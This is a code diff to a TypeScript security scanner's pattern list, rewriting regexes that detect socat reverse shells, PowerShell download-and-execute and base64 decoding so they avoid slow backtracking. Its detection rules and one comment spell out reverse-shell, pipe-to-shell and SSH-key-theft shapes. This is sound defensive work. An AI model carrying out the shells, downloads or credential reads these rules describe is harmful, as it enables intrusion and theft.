@@ -26,7 +26,9 @@ export const SECURITY_PATTERNS: PatternRule[] = [
   // A socket wired to a shell — not any line naming both (an audit hook that blocks `socket.` and `subprocess.`)
   { id: 'RS-005', pattern: /\bsocket\.socket\s*\([^\n]{0,1000}?(?:\bos\.dup2\s*\(|\bpty\.spawn\s*\(|\bsubprocess\.\w+\s*\([^\n]{0,300}?\b(?:ba|z|k)?sh\b)|\bsocket\b[^\n]{0,1000}?\.on\s*\(\s*['"]data['"][^\n]{0,1000}?\b(?:exec|execSync|spawn|spawnSync)\s*\(/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
   { id: 'RS-006', pattern: /python\S*\s+-c\s+['"]import\s+socket/i, category: 'reverse-shell', severity: 'critical', description: 'Python reverse shell' },
-  { id: 'RS-007', pattern: /\bsocat\b.*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
+  // Only the first socat on a line is tried (the lookbehind): `.*` from it
+  // covers every later one, and retrying each was quadratic (100 KB: 1.7 s).
+  { id: 'RS-007', pattern: /\bsocat\b(?<!\bsocat\b.*?\bsocat\b).*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
   // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e.
   // The first mkfifo and the first `| sh` after it are taken atomically
   // (`(?=(…))\1`) from the start of a line: the earliest choices are always
@@ -55,8 +57,10 @@ export const SECURITY_PATTERNS: PatternRule[] = [
   // `eval "$(wget -qO- …)"`, `source <(curl …)`
   { id: 'CP-004', pattern: /(?:\b(?:ba|z|k|da)?sh|\bsource|(?:^|[\s;&|])\.)\s+<\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell process substitution of a download' },
   { id: 'CP-005', pattern: /(?:\b(?:ba|z|k|da)?sh\s+-c|\beval)\s+["']?\$\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell command substitution of a download' },
-  // PowerShell: `iwr … | iex`, `iex (irm …)`
-  { id: 'CP-006', pattern: /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*\(?\s*(?:\(\s*)?(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i, category: 'curl-pipe', severity: 'critical', description: 'PowerShell download-and-execute' },
+  // PowerShell: `iwr … | iex`, `iex (irm …)`. As in CP-001, only the first
+  // download word before a `|` is tried; `\s*\(?\s*(?:\(\s*)?` split a space
+  // run after `iex` every way (100 KB: 6 s) and is now `\s*(?:\(\s*){0,2}`.
+  { id: 'CP-006', pattern: /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b(?<!\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*?\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b)[^|]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*(?:\(\s*){0,2}(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i, category: 'curl-pipe', severity: 'critical', description: 'PowerShell download-and-execute' },
 
   // Credential harvesting (from B@dskills)
   { id: 'CH-001', pattern: /\/\.ssh\/(?:id_rsa|id_ed25519|authorized_keys|config)/i, category: 'credential-harvest', severity: 'critical', description: 'SSH key access' },
@@ -95,7 +99,8 @@ export const SECURITY_PATTERNS: PatternRule[] = [
   { id: 'CW-003', pattern: /\bcoinbase\b.*\b(?:api|key|secret)\b/i, category: 'crypto-wallet', severity: 'warning', description: 'Coinbase API access' },
 
   // Obfuscation indicators (from Sclawhub)
-  { id: 'OB-001', pattern: /\bBuffer\.from\s*\([^,]+,\s*['"]base64['"]\)/i, category: 'obfuscation', severity: 'warning', description: 'Base64 decode operation' },
+  // First `Buffer.from(` of an argument run only (see CP-001)
+  { id: 'OB-001', pattern: /\bBuffer\.from\s*\((?<!\bBuffer\.from\s*\([^,]*?\bBuffer\.from\s*\()[^,]+,\s*['"]base64['"]\)/i, category: 'obfuscation', severity: 'warning', description: 'Base64 decode operation' },
   { id: 'OB-002', pattern: /\batob\s*\(/i, category: 'obfuscation', severity: 'warning', description: 'atob decode' },
   { id: 'OB-003', pattern: /\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){5,}/i, category: 'obfuscation', severity: 'warning', description: 'Hex-encoded string (6+ bytes)' },
   { id: 'OB-004', pattern: /\\u[0-9a-fA-F]{4}(?:\\u[0-9a-fA-F]{4}){5,}/i, category: 'obfuscation', severity: 'warning', description: 'Unicode-encoded string (6+ chars)' },
